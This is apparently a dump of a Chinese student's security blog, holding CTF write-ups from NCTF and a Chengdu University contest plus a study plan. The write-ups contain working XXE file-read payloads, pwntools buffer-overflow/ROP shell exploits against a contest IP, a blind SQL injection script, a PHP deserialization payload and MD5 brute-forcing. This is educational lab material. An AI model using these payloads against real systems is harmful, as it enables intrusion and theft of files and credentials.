1a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> axbctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本学年工作计划</title>
      <link href="/2019/11/29/unfinish-work/work/"/>
      <url>/2019/11/29/unfinish-work/work/</url>
      
        <content type="html"><![CDATA[<h1 id="任务清单"><a href="#任务清单" class="headerlink" title="任务清单"></a>任务清单</h1><h2 id="网安之路"><a href="#网安之路" class="headerlink" title="网安之路"></a>网安之路</h2><ul><li>XML学习</li><li>SQLi环境搭建学习</li><li>GraphQL </li><li>完成hackone101CTF</li><li>完成hack the box</li><li>《网络空间安全基础》</li><li>《密码学与网络空间安全》</li></ul><h2 id="区块链学习之路"><a href="#区块链学习之路" class="headerlink" title="区块链学习之路"></a>区块链学习之路</h2><ul><li>Go web学习</li><li>以太坊学习</li><li>《精通以太坊智能合约开发》</li><li>学习复现黎跃春的博客</li></ul><h2 id="必学"><a href="#必学" class="headerlink" title="必学"></a>必学</h2><ul><li>Docker</li></ul><h2 id="学校要求学习内容"><a href="#学校要求学习内容" class="headerlink" title="学校要求学习内容"></a>学校要求学习内容</h2><ul><li>HTML&amp;CSS</li><li>数据结构</li><li>Java Web程序设计</li><li>python 数据分析</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>南京邮电大学 NCTF 做题记录</title>
      <link href="/2019/11/27/ctf/web/nctf/"/>
      <url>/2019/11/27/ctf/web/nctf/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-Web"><a href="#第一部分-Web" class="headerlink" title="第一部分 Web"></a>第一部分 Web</h1><p>本着从CTF中找知识点学习的精神，这周又参加了南京邮电大学的CTF比赛，说是外校前二十名有奖，比赛的时候发现事情并不简单，，，只做出来了没几道题</p><h2 id="Fake-XML-cookbook"><a href="#Fake-XML-cookbook" class="headerlink" title="Fake XML cookbook"></a>Fake XML cookbook</h2><p>这道题与上一次UNCTF新星赛的那道XML简直一模一样（UNCTF的WP还没写….）</p><p>不过那道题的flag是放在flag.php中的</p><p>这道题他直接给了 <strong>hint: flag in /flag</strong></p><p>这就比较简单了，毕竟签到题，也没有过滤</p><p>BP抓包（题目关了，如果有复现的话再来放图）</p><p><strong>payload:</strong></p><pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="utf-8"?><!DOCTYPE Anything [<!ENTITY entityex SYSTEM "file:///flag>]><username>&entityex;</username></code></pre><h2 id="True-XML-cookbook"><a href="#True-XML-cookbook" class="headerlink" title="True XML cookbook"></a>True XML cookbook</h2><p>这道题跟上道题的代码是一样的，但是<strong>flag</strong>放的位置不一样，比赛的时候没做出来，赛后看了大佬的WP后才知道，这道题考的是找内网真实地址。。</p><p>学习地址  <a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a> </p><p>payload：</p><pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><user><username>&xxe;</username><password>123</password></user></code></pre><pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///proc/net/arp"> ]><user><username>&xxe;</username><password>123</password></user></code></pre><pre class=" language-lang-xml"><code class="language-lang-xml"><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://192.168.1.8"> ]><user><username>&xxe;</username><password>123</password></user></code></pre><h2 id="剩下的等题目复现再写吧，TCL"><a href="#剩下的等题目复现再写吧，TCL" class="headerlink" title="剩下的等题目复现再写吧，TCL"></a>剩下的等题目复现再写吧，TCL</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成都大学第二届“玄武杯”做题记录2</title>
      <link href="/2019/11/19/ctf/pwn/cdusec-ctf2/"/>
      <url>/2019/11/19/ctf/pwn/cdusec-ctf2/</url>
      
        <content type="html"><![CDATA[<h1 id="第三部分-Pwn"><a href="#第三部分-Pwn" class="headerlink" title="第三部分 Pwn"></a>第三部分 Pwn</h1><p>本次pwn就一道题，也不难，但也是我第一次做pwn…</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>拿到题目，IDA走一下（64位）</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [sp+6h] [bp-Ah]@1  printf("tell me your name?", argv, envp);  read(0, &buf, 0x64uLL);  return 0;}</code></pre><p>典型的read溢出</p><p>buf 只有0xA个字节，而read确可以读取100个字节</p><p>这就造成了溢出</p><p>我们可以溢出EBP到EIP从而控制函数的返回地址(64位一般是8个字节)</p><p>这时我们发现</p><pre class=" language-lang-c"><code class="language-lang-c">int system_bin(){  return system("/bin/bash");}</code></pre><p>新生赛吗，一切有都是那么的自然</p><p>找到system_bin函数的地址<strong>0x400577</strong></p><p>写出j简单的payload</p><pre class=" language-lang-txt"><code class="language-lang-txt">'a'*0xA + 'a'*8 + system_addr=(0x400577)</code></pre><p>然后祭出我们的pwntools</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python # -*- coding:utf-8 -*-from pwn import *#sh = remote('47.93.249.236',10010)system_addr=0x400577payload='a'* 18 +p64(system_addr)sh = process('./pwn')sh.sendline(payload)sh.interactive()</code></pre><p>本地测试成功</p><p>好，修改提交，出问题了</p><pre class=" language-lang-txt"><code class="language-lang-txt">sh: 1: /bin/bash: not found</code></pre><p>然后就又去学习，修改脚本，问大佬怎么回事</p><p>终于找到了</p><p>原来是出题人在docker中没有布置bash, 只布置了sh</p><p>emmm,懂了</p><p>修改脚本，找_system的地址，pop ret rdi的地址（64位与32位不一样）</p><p>大佬的解释</p><pre class=" language-lang-txt"><code class="language-lang-txt">64位程序在调用system函数时，参数的传递方式和32位不一样，32位是通过栈传参，而64位通过edi寄存器传参，所以这时我们的思路变成如何覆盖edi的值，通过基本rop就可以做到，利用程序自己的带有pop rdi;pop rdi语句是将当前的栈顶元素传递给edi，在执行pop语句时，只要保证栈顶元素是”/bin/sh”的地址，并将返回地址设置为system。</code></pre><p>emmm,学到了</p><pre class=" language-lang-txt"><code class="language-lang-txt">ROPgadget --binary pwn --only "pop|ret" | grep "rdi"</code></pre><p>在kail里运行这条命令就可以找到pop的地址</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level='debug'pwn=remote('47.93.249.236',10010)elf=ELF('./pwn')        pop_addr=0x0000000000400633sys_addr=0x0000000000400460  #获取系统函数地址sh_addr=elf.search('sh').next()   #获取'bin'字符串地址payload= 'a'* 18 + p64(pop_addr)+p64(sh_addr) + p64(sys_addr)pwn.send(payload)pwn.interactive()pwn.close()</code></pre><p>成功getshell,然后就 ls,cat flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_Pwn_New_Star!}</code></pre><p>还有在bugku pwn4上看到</p><pre class=" language-lang-txt"><code class="language-lang-txt">'$0'</code></pre><p>也可以当作bash,因为</p><pre class=" language-lang-txt"><code class="language-lang-txt">'$0'</code></pre><p>就是bash本身</p><h1 id="第四部分-Misc"><a href="#第四部分-Misc" class="headerlink" title="第四部分 Misc"></a>第四部分 Misc</h1><p>misc这次的比较简单，都是一些比较基础的加密方式解密方式，一共七道题。</p><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><p>根据题目base16 base32 base64 解一遍就出来了</p><p>用在线网站解码也行，我试了一下次数不多，所以就直接用网站解码了，没写脚本</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Cdu_sec_Base64}</code></pre><h2 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h2><p>放进kail里面用binwalk -e 提取一下</p><p>发现一个没有密码的压缩包</p><p>里面的内容是</p><pre class=" language-lang-txt"><code class="language-lang-txt">%26%23113%3B%26%23119%3B%26%23108%3B%26%23114%3B%26%23123%3B%26%23744810295113%3B%26%2349%3B%26%23121%3B%26%23111%3B%26%2395%3B%26%2369%3B%26%23115%3B%26%2349%3B%26%23100%3B%26%23125%3Bw+h+a+t%27s%20t+h+e%20n+e+x+t%20a+f+t+e+r+t%20t+h+e+U+R+L</code></pre><p>这一看就是url编码</p><p>然后解码</p><pre class=" language-lang-txt"><code class="language-lang-txt">&#113;&#119;&#108;&#114;&#123;&#744810295113;&#49;&#121;&#111;&#95;&#69;&#115;&#49;&#100;&#125;w h a t's t h e n e x t a f t e r t t h e U R L</code></pre><p>这在一看就是Unicode编码，不过需要改一下</p><pre class=" language-lang-txt"><code class="language-lang-txt">&#113;&#119;&#108;&#114;&#123;&#74;&#48;&#102;&#95;&#113;&#49;&#121;&#111;&#95;&#69;&#115;&#49;&#100;&#125;</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">qwlr{J0f_q1yo_Es1d}//解出来这个</code></pre><p>不像flag啊</p><p>再来一次凯撒解码</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Y0u_f1nd_Th1s}</code></pre><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>就这真的签到</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{welc0me_to_cdusec_Ctf}</code></pre><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>键盘划线</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{CDUSEC}</code></pre><h2 id="大力出奇迹"><a href="#大力出奇迹" class="headerlink" title="大力出奇迹"></a>大力出奇迹</h2><p>zip密码爆破 ARCHPR就可以爆破</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Aestheticization_of_violence}</code></pre><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>wireshark 流量分析工具</p><p>跟踪TCP流量，将流调为1</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{tcpip_is_awesome}</code></pre><h2 id="密码是啥"><a href="#密码是啥" class="headerlink" title="密码是啥"></a>密码是啥</h2><p>知道了密码md5值的前四位和后三位就可以根据题目写脚本爆破了</p><p>脚本如下(python 2.7)</p><p>PS：脚本写的LOW，要爆好几分钟，据说多线程会快点，但不会写，有空在看看吧。</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env python # -*- coding:utf-8 -*-import hashlibhead="b996"foot="3e2"word=''s="qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"for a in s:    for b in s:        for c in s:            for d in s:                for e in s:                    word=a+b+c+d+e                    mdd=word.encode()                    # print (word)                    tmp=hashlib.md5(mdd).hexdigest()                    # print(tmp)                    # if tmp[:4]==head:                    #     print(tmp)                    # print(tmp)                    # print(tmp[29:32])                    if tmp[29:32]==foot and tmp[:4]==head:                        print(tmp)                        break</code></pre><p>记得当时爆出来两个</p><pre class=" language-lang-txt"><code class="language-lang-txt">b9966524dbef725a3ad170446855d3e2b99648ad338f83a9ace00e19f97b53e2</code></pre><p>具体是哪一个我也记不清了，就当是第一个吧</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{FjcOy}</code></pre><h1 id="赛后总结"><a href="#赛后总结" class="headerlink" title="赛后总结"></a>赛后总结</h1><p>这次比赛没有密码学，总体难度比较简单，题量也不大，新手有足够的时间来搜索资料学习，辛苦出题和维护的师傅们了。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成都大学第二届“玄武杯”做题记录</title>
      <link href="/2019/11/18/ctf/web/cdusec-ctf/"/>
      <url>/2019/11/18/ctf/web/cdusec-ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-web"><a href="#第一部分-web" class="headerlink" title="第一部分 web"></a>第一部分 web</h1><p>大概看了下加上最后两天上的那一道题，本次web一共有九道题，题目不是很难（毕竟是面向19级新生的比赛），但还是记录一下，回忆一下上一年的惨痛经历….（被大佬打蒙了）。</p><p>不要问为什么都是代码和文字，问就是图床没搭好，还在测试中…</p><h2 id="weekpassword"><a href="#weekpassword" class="headerlink" title="weekpassword"></a>weekpassword</h2><p>这题从名字上看就知道是弱口令，直接百度弱口令TOP1000，放进Bp里面跑，跑出来00000就是密码，提交就有flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Fine_WeBsH3ll}</code></pre><h2 id="serialization-1"><a href="#serialization-1" class="headerlink" title="serialization-1"></a>serialization-1</h2><p>php反序列化，，，记得当初第一次参见CTF的时候就是这道题不会做，导致就差这一道题没能拿奖</p><p>题目地址： <a href="http://47.93.249.236:10009/index.php" target="_blank" rel="noopener">http://47.93.249.236:10009/index.php</a> </p><pre class=" language-lang-php"><code class="language-lang-php"><?phperror_reporting(0);class Test{    private $a = 'nothing';    public function __destruct()    {        if($this->a != 'nothing') {            highlight_file('flag.php');        }        else {            echo 'No Flag!';        }    }}if(isset($_GET['data'])) {    unserialize($_GET['data']);}else {    highlight_file(__FILE__);}    ?></code></pre><p>题目给了源代码，从代码中我们可以看出来，我们要拿到flag的话，必须让 <strong>a ! =’nothing’</strong></p><p>但是 <strong>a</strong> 在声明的时候已经等于 <strong>nothing</strong> 了</p><p>而我们能控制的参数只有 <strong>data</strong> </p><pre class=" language-lang-php"><code class="language-lang-php">unserialize($_GET['data']);</code></pre><p>从这里我们看到我们传入的<strong>data</strong>参数会被<strong>unserialize()</strong> 这个函数处理</p><p>看一下 <strong>unserialize（）</strong> 这个函数的作用</p><p> <strong>将已序列化的字符串变回 PHP 的值</strong> </p><p>这就很清晰明了了</p><p>我们可以通过data传入一个已经序列化的字符串来覆盖掉 <strong>a</strong> 的值</p><pre class=" language-lang-php"><code class="language-lang-php"><?php    class Test{    private $a = "666";    }    $flag = new Test();    print_r(serialize($flag));?></code></pre><p>执行这段代码后得到</p><pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"Testa";s:3:"666";}</code></pre><p>但这还不够</p><pre class=" language-lang-php"><code class="language-lang-php">O:4:"Test":1:{s:7:"%00Test%00a";s:3:"666";}</code></pre><p>由于变量 <strong>a</strong> 的类型为 <strong>private</strong></p><p>因此我们需要在类名 <strong>Test</strong> 前面加上 <strong>%00</strong> </p><p>具体要参考这篇文章  <a href="https://blog.csdn.net/qq_42196196/article/details/81217375" target="_blank" rel="noopener">https://blog.csdn.net/qq_42196196/article/details/81217375</a> （HITCON 2016一道web）</p><p>因此我们最终的payload为：</p><pre class=" language-lang-txt"><code class="language-lang-txt">http://47.93.249.236:10009/index.php?data=O:4:%22Test%22:1:{s:7:%22%00Test%00a%22;s:3:%22666%22;}</code></pre><p>访问得到 <strong>flag</strong></p><pre class=" language-lang-php"><code class="language-lang-php"><?php$flag = 'flag{0030-0571-8890-4673}';?></code></pre><h2 id="百度"><a href="#百度" class="headerlink" title="百度"></a>百度</h2><p>这道题从名字上就可以知道（zuo ti zuo duo le jiu ke yi zhi dao）,关键在<strong>robots.txt</strong> 上，一般情况下网站都会有这个文件，他的主要功能就和他的文件内容 一样清晰明了</p><pre class=" language-lang-txt"><code class="language-lang-txt">User-agent: *Disallow:</code></pre><p>主要是来防爬虫，在真实的渗透测试案例中经常会出现，比如用来找<strong>admin</strong> 界面….</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{BoBo-RoRo-ToTo}</code></pre><p>还有别的不想被爬取到的页面，具体可以看百度上的的robots.txt</p><pre class=" language-lang-txt"><code class="language-lang-txt">https://www.baidu.com/robots.txt</code></pre><h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p>题如其名，MySQL注入中的bool盲注</p><p>这道题用 sqlmap 就可以做，工具固然好用，但拒绝做脚本小子</p><p>但本着学习的精神，主要是好久不用<strong>python</strong>了</p><p>就写了一个简单的脚本 (python2.7)</p><pre class=" language-lang-python"><code class="language-lang-python">import requestsdef login(_username,_password):    url="http://47.93.249.236:10001/index.php"    data={        "username":_username,        "password":_password    }    response=requests.post(url,data=data)    content=response.content    if "Login Success!" in content:        return True    else:        return Falsedef find_dblen():    for i in range(10):        _username = "admin' and (length(database())) = %d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbname():    find_name = ""    length=find_dblen()+1    for i in range(length):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr(database(),%d,%d))=%d) #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_dbtable_len():    for i in range(100):        _username = "admin' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,2)=%d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbtable_name():    find_name = ""    length=find_dbtable_len()+1    for i in range(length):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,%d)))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_dbcolum_len():    for i in range(10):        _username = "admin' and (select length(column_name) from information_schema.columns where table_name=0x7573657273 limit 0, 1) = %d #" % (i)        _password = "admin"        if login(_username, _password):            print _username            return idef find_dbcolum_name():    find_name = ""    for i in range(9):        for j in range(0x80, 0x20, -1):            _username = "admin' and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 1,1),%d,%d))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakdef find_flag():    find_name = ""    for i in range(40):        for j in range(0x80, 0x20, -1):            _username = "admin' and (ascii(substr((select password from users limit 0,1),%d,%d)))=%d #"%(i,i,j)            _password = "admin"            if login(_username, _password):                print _username                find_name += chr(j)                print find_name                breakif __name__ == '__main__':    find_flag()</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{sql1-wArn1ng}</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">#sql盲注注入流程:一、猜数据库的长度    √ 4#              二、猜数据库的名字    √ mydb#              三、猜数据库中数据表的名字的长度 √ 第一个表的长度是5#              四、猜数据库中数据表的名字  表名为 users#              五、猜数据库中数据表中列的数量 √ 3#              六、猜数据库中数据表中列的名字 √ id username password#              七、猜数据库中数据表中列中字段的数量#              八、猜数据库中数据表中列中字段的名字</code></pre><p>上面是总结的一些东西，可能还不够完善</p><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>这道题主要是想考察hash的长度扩展攻击，可能是出于对新生的照顾，下降了难度</p><p>题目源码</p><pre class=" language-lang-php"><code class="language-lang-php">function ctt($key){    $t="";    for($i=0;$i < strlen($key) ; ++$i)    {        $t.=chr(ord($key[$i])^$i);    }    return $t;}$auth = false;$role1 = "xxxxxxxxx";$salt = "xxxxxxxxxx";//长度不超过15if (isset($_COOKIE["role_true"])) {      $hsh = $_COOKIE["hsh"];      if ($_COOKIE["role_true"] === $role1 && $hsh   ===md5($salt.urldecode($_COOKIE["role"]))) {    $auth = true;} else {    $auth = false; } } else {    $s =$role1;    setcookie('role',ctt(base64_encode($s)));                $hsh = md5($salt.ctt(base64_encode($s)));    setcookie('hsh',$hsh); }   if ($auth) {   echo "Welcome Admin. Your flag is ";} else {   echo "Only True Admin can see the flag!!"; }</code></pre><p>从代码中我们可以看出，我们要想输出 <strong>flag</strong> 必须要满足</p><pre class=" language-lang-php"><code class="language-lang-php">$_COOKIE["role_true"] === $role1 && $hsh === md5($salt.urldecode($_COOKIE["role"]))</code></pre><p>通过F12查看源代码 我们可以得到 </p><pre class=" language-lang-txt"><code class="language-lang-txt">role=YVPweR3oRN%3B%7Bnj32hsh=5beee4019e55f453db9daf0df7d90879</code></pre><p>分析代码写脚本解出 role</p><p>脚本 (需要先解出 <strong>url解码之后的role</strong> )</p><pre class=" language-lang-python"><code class="language-lang-python">import base64def dctt(key):    t=''    for i in range(len(key)):        t = t + chr(ord(key[i]) ^ i)    result = base64.b64decode(t)    return resultif __name__ == '__main__':    key = "YVPweR3oRN;{nj32"    print dctt(key)</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">role=adminadmin</code></pre><p>因此我们现在只需要让</p><pre class=" language-lang-txt"><code class="language-lang-txt">role_true=adminadmin</code></pre><p>就可以得出 <strong>flag</strong> </p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{hash_and_php_are_very_good!!!}</code></pre><h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><p>这题可能有问题…</p><pre class=" language-lang-php"><code class="language-lang-php">no include('flag.php');$f1 = @$_GET['f1'];$f2 = @$_POST['f2'];$f3 = @$_COOKIE['f3'];if($f2 !== '0') {    echo 'no';}else {    if($f1 == 0 and $f1 !== 0) {        $f2 == $f3;        if(md5($f2) == 0 and $f2 == 0) {            echo $flag;        }    }}</code></pre><p>还是先分析一下代码</p><p>首先 我们需要通过 GET 方式传入 f1 , POST 方式传入 f2 ,和在 cookie 中设置 f3</p><p>其次首先要满足 （依次）</p><pre class=" language-lang-php"><code class="language-lang-php">f2===0</code></pre><pre class=" language-lang-php"><code class="language-lang-php">f1=0 f1!==0</code></pre><pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&&f2=0</code></pre><p>但实际过程发现，我们只要让</p><pre class=" language-lang-php"><code class="language-lang-php">f1=0abc //php是弱类型语言，会将 '0abc'看成 '0'</code></pre><pre class=" language-lang-php"><code class="language-lang-php">f2=0</code></pre><p>就可以得出flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}</code></pre><p>但其实我们还要传入</p><pre class=" language-lang-php"><code class="language-lang-php">f3[]=0</code></pre><p>来绕过</p><pre class=" language-lang-php"><code class="language-lang-php">md5(f2)==0&&f2=0</code></pre><p>可能是出题人疏忽了…,或者我想多了….</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Due_to_weak_type:)}</code></pre><h2 id="有趣的上传点"><a href="#有趣的上传点" class="headerlink" title="有趣的上传点"></a>有趣的上传点</h2><p>确实有趣，一点思路没有，上传过去文件就没了，访问也访问不到，用工具扫出来了XSS，但用不了…</p><p>真的不会写，也没人做出来，赛后看官方WP后在写一篇专门关于这个题的吧</p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>POST传参数，用火狐的hackbar或者Bp抓包改请求方式都可以</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{Tw0~E4sy-pHp}</code></pre><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>GET传参数，直接在URL后面写就行</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{A~E4sy-pHp}</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>web部分到这里就完了，每道题都不是很难，关键是找里面的知识点来学，难的题也不过就是把一些简单的知识点给集合起来，关于GET,POST请求部分的东西我会放在GO Web学习当中来讨论。</p><h1 id="第二部分-Reverse"><a href="#第二部分-Reverse" class="headerlink" title="第二部分 Reverse"></a>第二部分 Reverse</h1><p>这一部分总共有5道题，除了点击一千次有点废百度之外，其他的题都还是很基础的</p><h2 id="Android-Studio-Usage"><a href="#Android-Studio-Usage" class="headerlink" title="Android Studio Usage"></a>Android Studio Usage</h2><p>安卓逆向题，主要考察的就是安卓程序的结构，但flag 一开始给错了，加上那个hanhan的函数让我觉得我也找错了，直到flag改了回来。我人傻了，我就是个hanhan,还下了Android Studio来找，找来找去也就那一串…..</p><p>不多说了，先放一下Android 程序的结构</p><pre class=" language-lang-txt"><code class="language-lang-txt">EMMM,图床没搭好先不放了，</code></pre><p>根据结构我们可以知道主程序的位置就在</p><pre class=" language-lang-txt"><code class="language-lang-txt">\MyApplication\app\src\main\java\</code></pre><p>里面，而里面只有一个hanhan.java</p><p>里面的内容是</p><pre class=" language-lang-java"><code class="language-lang-java">import java.util.Scanner;public class hanhan {    public static void main(String[] args) {        // TODO Auto-generated method stub        Scanner in =new Scanner(System.in);        String yours;        String people="ZmxhZ3tZb3UgYXJlIHNpbXBsZSBhbmQgaG9uZXN0fQ==";    }}</code></pre><p>那  flag 就显而易见了，</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{You are simple and honest}</code></pre><h2 id="猜数？"><a href="#猜数？" class="headerlink" title="猜数？"></a>猜数？</h2><p>IDA 源代码（64位）分析 发现</p><pre class=" language-lang-c"><code class="language-lang-c">#include<studio.h>int main(){  int result; // eax@4  __int64 v4; // rsi@4  __int64 v5; // [sp+8h] [bp-38h]@1  __int64 v6; // [sp+10h] [bp-30h]@1  __int64 v7; // [sp+18h] [bp-28h]@1  __int64 v8; // [sp+20h] [bp-20h]@1  __int64 v9; // [sp+28h] [bp-18h]@1  __int64 v10; // [sp+30h] [bp-10h]@1  __int64 v11; // [sp+38h] [bp-8h]@1  v11 = *MK_FP(__FS__, 40LL);  v5 = 0LL;  srand(10520);  v6 = rand() % 10520;  v7 = rand() % 10520;  v8 = rand() % 10520;  v9 = rand() % 10520;  v10 = v8 + v7 + v6 + v9;  printf("Input your key:", argv);  __isoc99_scanf("%ld", &v5);  if ( v10 == v5 )    printf("flag{cdusec_wsj_%ld}", v5);  else    printf("wrong!");  result = 0;  v4 = *MK_FP(__FS__, 40LL) ^ v11;  return 0;}</code></pre><p>大概就是我们需要输入一个数，并且这个数要等于<strong>v10</strong> 也就是四个随机的数相加</p><p>我们发现<strong>srand()</strong>函数中只有一个参数</p><p>众所周知，当<strong>srand()</strong> 函数里只有一个参数的时候会生成伪随机数</p><p>伪随机数也就是当<strong>srand()</strong>这个函数里的参数确定了以后，生成的随机数将不会发生改变</p><p>知道了这个原理以后，我们编写脚本</p><pre class=" language-lang-c"><code class="language-lang-c">#include<stdio.h>int main(){    int v6,v7,v8,v9;    int result;    srand(10520);    v6 = rand() % 10520;    v7 = rand() % 10520;    v8 = rand() % 10520;    v9 = rand() % 10520;    result=v6+v7+v8+v9;    printf("%ld",result);    return 0}</code></pre><p>值得一提的是这个程序在linux下运行和在windows下运行结果是不一样的</p><p>命令：</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -o flag flag.c./flag</code></pre><p>这也是为什么他叫linux的原因吧</p><p>结果：</p><pre class=" language-lang-txt"><code class="language-lang-txt">23231</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusec_wsj_23231}</code></pre><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><p>这道题比较简单直接给了一个可以运行的python文件（python3.x）</p><pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'a= input()a=a.encode()c=''for i in a:    #print(i)    c=c+chr(i^3)#print(c)if(c.encode()==b):    print("youare right:")    print(a)else:    print("wrong!")</code></pre><p>这就简单了，一顿分析之后</p><p>直接修改脚本</p><pre class=" language-lang-python"><code class="language-lang-python">print("Plase input your flag:")b=b'\x65\x6f\x62\x64\x78\x60\x67\x76\x70\x66\x60\x5c\x71\x66\x60\x31\x5c\x66\x62\x70\x7a\x7e'c=''for i in b:    c=c+chr(i^3)print(c)</code></pre><pre class=" language-lang-txt"><code 